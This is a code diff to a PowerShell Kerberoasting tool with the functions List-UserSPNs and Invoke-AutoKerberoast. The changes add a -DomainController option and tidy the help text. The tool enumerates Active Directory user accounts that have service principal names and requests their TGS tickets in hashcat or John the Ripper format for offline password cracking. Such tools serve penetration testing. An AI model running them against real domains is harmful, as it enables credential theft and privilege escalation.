@@ -21,26 +21,27 @@
 function List-UserSPNs
 {
 <#
-.SYNOPSIS
-This function will List all SPNs that use User accounts.  The -Domain and -Group parameters can be used to limit your results.
+    .SYNOPSIS
+    This function will List all SPNs that use User accounts.  The -Domain and -Group parameters can be used to limit your results.
 
-.PARAMETER Domain
-This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.
+    .PARAMETER Domain
+    This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.
 
-.PARAMETER GroupName
-This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins"
+    .PARAMETER GroupName
+    This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins"
 
-.PARAMETER ViewAll
-Switch that displays ALL SPNs, even if they are protected by the same user.
-Default is to only show 1 SPN per user account (e.g. if two MSSQL SPNs are registered to the user sqlAdmin, it will only request a ticket for the first service)
+    .PARAMETER DomainController
+    This will redirect queries to a specific Domain Controller.  This is especially useful when environment doesn't use a DC for DNS resolutions.
+    NOTE: this will only return TGS Tickets from that DC's Domain, instead of the entire forest.
 
-.PARAMETER Request
-Switch to also request TGS tickets.  Default is only list available user SPNs.
+    .PARAMETER ViewAll
+    Switch that displays ALL SPNs, even if they are protected by the same user.
+    Default is to only show 1 SPN per user account (e.g. if two MSSQL SPNs are registered to the user sqlAdmin, it will only request a ticket for the first service)
 
-.EXAMPLE
-PS C:\> List-UserSPNS
-PS C:\> List-UserSPNS -GroupName "Domain Admins"
-PS C:\> List-UserSPNS -Domain dev.testlab.local
+    .EXAMPLE
+    PS C:\> List-UserSPNS
+    PS C:\> List-UserSPNS -GroupName "Domain Admins"
+    PS C:\> List-UserSPNS -Domain dev.testlab.local
 #>
 
     [CmdletBinding()]
@@ -52,6 +53,9 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
     [string]$GroupName = "",
 
     [Parameter(Mandatory=$False)]
+    [string]$DomainController = "",
+
+    [Parameter(Mandatory=$False)]
     [switch]$ViewAll
     )
 
@@ -59,7 +63,11 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
 
     $GCs = @()
 
-    If ( $Domain )
+    if ( $DomainController )
+    {
+        $GCs += $DomainController
+    }   
+    elseif ( $Domain )
     {
         $GCs += $Domain
     }
@@ -128,7 +136,7 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
     ForEach ( $GC in $GCs )
     {
     	$searcher = New-Object System.DirectoryServices.DirectorySearcher
-    	$searcher.SearchRoot = "LDAP://" + $GC
+        $searcher.SearchRoot = "LDAP://" + $GC
     	$searcher.PageSize = 1000
     	$searcher.Filter = "(&(!objectClass=computer)(servicePrincipalName=*))"
     	$searcher.PropertiesToLoad.Add("serviceprincipalname") | Out-Null
@@ -139,8 +147,6 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
         $searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
         $searcher.PropertiesToLoad.Add("whencreated") | Out-Null
         $searcher.PropertiesToLoad.Add("samaccountname") | Out-Null
-    	#$searcher.PropertiesToLoad.Add("displayname") | Out-Null
-    	#$searcher.PropertiesToLoad.Add("pwdlastset") | Out-Null
 
     	$searcher.SearchScope = "Subtree"
     	$results = $searcher.FindAll()
@@ -174,8 +180,7 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
                     @{Name="DistinguishedName";    Expression={$distingName} }, `
                     @{Name="MemberOf";             Expression={$groups} }, `
                     @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} }, `
-                    @{Name="whencreated";          Expression={$result.Properties["whencreated"][0].ToString()} } #, `
-                    #@{Name="DisplayName";          Expression={$result.Properties["displayname"][0].ToString()} },
+                    @{Name="whencreated";          Expression={$result.Properties["whencreated"][0].ToString()} } 
                 }
             }
     	}
@@ -185,45 +190,53 @@ PS C:\> List-UserSPNS -Domain dev.testlab.local
 function Invoke-AutoKerberoast
 {
 <#
-.SYNOPSIS
-This function automatically requests and display TGS tickets in a hashcat-compatible format.  The -Domain and -GroupName parameters can be used to execute targeted queries.
+    .SYNOPSIS
+    This function automatically requests and display TGS tickets in a hashcat-compatible format.  The -Domain and -GroupName parameters can be used to execute targeted queries.
 
-.PARAMETER Domain
-This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.
+    .PARAMETER Domain
+    This will only query the DC in a specified domain for SPNs that use User accounts.  Default is to query entire Forest.
 
-.PARAMETER GroupName
-This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins", or simply "admin" (wildcards will be automatically added to both sides of groupname).
+    .PARAMETER GroupName
+    This paremeter will only return SPNs that use users in a specific group, e.g. "Domain Admins", or simply "admin" (wildcards will be automatically added to both sides of groupname).
 
-.PARAMETER SPN
-This paremeter will request and process TGS tickets for an array of SPNs (a single SPN record may also be specified).  Recommend running List-UserSPNs first to identify name of useful SPNs.
+    .PARAMETER SPN
+    This paremeter will request and process TGS tickets for an array of SPNs (a single SPN record may also be specified).  Recommend running List-UserSPNs first to identify name of useful SPNs.
 
-.PARAMETER HashFormat
-Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat style hash formatting.
-Defaults to 'Hashcat'.
+    .PARAMETER DomainController
+    This will redirect List-UserSPNs queries to a specific Domain Controller.  This is especially useful when environment doesn't use a DC for DNS resolutions.
+    NOTE: this will only return SPNs from that DC's Domain, instead of the entire forest.
 
-.EXAMPLE
-PS C:\> List-UserSPNS
-PS C:\> List-UserSPNS -GroupName "Domain Admins"
-PS C:\> List-UserSPNS -GroupName "Domain Admins" -Domain dev.testlab.local
-PS C:\> List-UserSPNS -GroupName "Domain Admins" -Domain dev.testlab.local -HashFormat John
-PS C:\> List-UserSPNS -SPN "MSSQLSvc/sqlBox.testlab.local:1433"
-PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlBox2.dev.testlab.local:1433")
+    .PARAMETER HashFormat
+    Either 'John' for John the Ripper style hash formatting, or 'Hashcat' for Hashcat style hash formatting.
+    Defaults to 'Hashcat'.
+
+    .EXAMPLE
+    PS C:\> Invoke-AutoKerberoast
+    PS C:\> Invoke-AutoKerberoast -GroupName "Domain Admins"
+    PS C:\> Invoke-AutoKerberoast -GroupName "Domain Admins" -Domain dev.testlab.local
+    PS C:\> Invoke-AutoKerberoast -GroupName "Domain Admins" -Domain dev.testlab.local -HashFormat John
+    PS C:\> Invoke-AutoKerberoast -SPN "MSSQLSvc/sqlBox.testlab.local:1433"
+    PS C:\> Invoke-AutoKerberoast -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlBox2.dev.testlab.local:1433")
+    PS C:\> Invoke-AutoKerberoast -DomainController 172.20.200.100
 #>
 
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$False)]
-        [string]$GroupName="",
+        [string]$GroupName = "",
 
         [Parameter(Mandatory=$False)]
-        [string]$Domain="",
+        [string]$Domain = "",
+
+        [Parameter(Mandatory=$False)]
+        [string]$DomainController = "",
 
         [Parameter(Mandatory=$False)]
         [string[]]$SPN,
 
         [ValidateSet('John', 'Hashcat')]
         [Alias('Format')]
-        [String]$HashFormat='Hashcat',
+        [String]$HashFormat = "Hashcat",
 
         [Parameter(Mandatory=$False)]
         [Switch]$Mask
@@ -250,7 +263,7 @@ PS C:\> List-UserSPNS -SPN @("MSSQLSvc/sqlBox.testlab.local:1433","MSSQLSvc/sqlB
     }
     else
     {
-        $SPNs = List-UserSPNs -Group $GroupName -Domain $Domain | Select SPN, SamAccountName, DistinguishedName
+        $SPNs = List-UserSPNs -Group $GroupName -Domain $Domain -DomainController $DomainController | Select SPN, SamAccountName, DistinguishedName
 
         if ( ! $SPNs )
         {
